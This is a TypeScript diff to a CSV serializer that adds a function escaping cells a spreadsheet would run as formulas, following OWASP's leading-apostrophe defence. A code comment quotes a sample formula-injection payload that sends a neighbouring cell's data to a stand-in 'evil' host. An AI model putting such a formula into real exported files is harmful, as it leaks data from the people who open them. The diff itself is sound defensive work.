@@ -17,7 +17,29 @@ function serialize(value: CsvValue): string {
   if (value === null || value === undefined) return ''
   if (value instanceof Date) return value.toISOString()
   if (typeof value === 'boolean') return value ? 'yes' : 'no'
-  return String(value)
+  if (typeof value === 'number') return String(value)
+  return neutralizeFormula(value)
+}
+
+/**
+ * A cell that a spreadsheet would run as a formula.
+ *
+ * These files are opened in Excel or Sheets by staff and venues, and a listing
+ * name or a note typed as `=HYPERLINK("http://evil/?"&A2,"Open")` would run
+ * there, able to read neighbouring cells out to a remote address. The standard
+ * defence (OWASP) is a leading apostrophe, which every spreadsheet reads as
+ * "this is text".
+ *
+ * Text made only of digits and punctuation is left alone: a phone number like
+ * `+961 3 123 456` or a figure like `-12.5` cannot call a function, and should
+ * not arrive with a stray apostrophe.
+ */
+const FORMULA_START = /^[=+\-@\t\r]/
+const NUMERIC_TEXT = /^[+-]?[\d\s().,/-]+$/
+
+export function neutralizeFormula(text: string): string {
+  if (!FORMULA_START.test(text) || NUMERIC_TEXT.test(text)) return text
+  return `'${text}`
 }
 
 function escapeField(value: CsvValue): string {
